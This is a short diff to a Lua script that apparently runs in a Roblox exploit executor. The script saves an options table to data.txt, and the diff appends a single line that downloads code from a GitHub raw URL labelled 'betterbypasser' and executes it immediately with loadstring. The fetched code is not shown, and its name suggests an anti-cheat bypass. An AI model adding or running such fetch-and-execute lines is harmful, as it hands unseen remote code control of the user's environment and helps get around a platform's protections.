@@ -6,3 +6,5 @@ local options = ({...})[1] or {
  
 local content = game.HttpService:JSONEncode(options)
 writefile("data.txt", content)
+ 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/synnyyy/synergy/betterbypasser/normalbetterbypasser", true))()
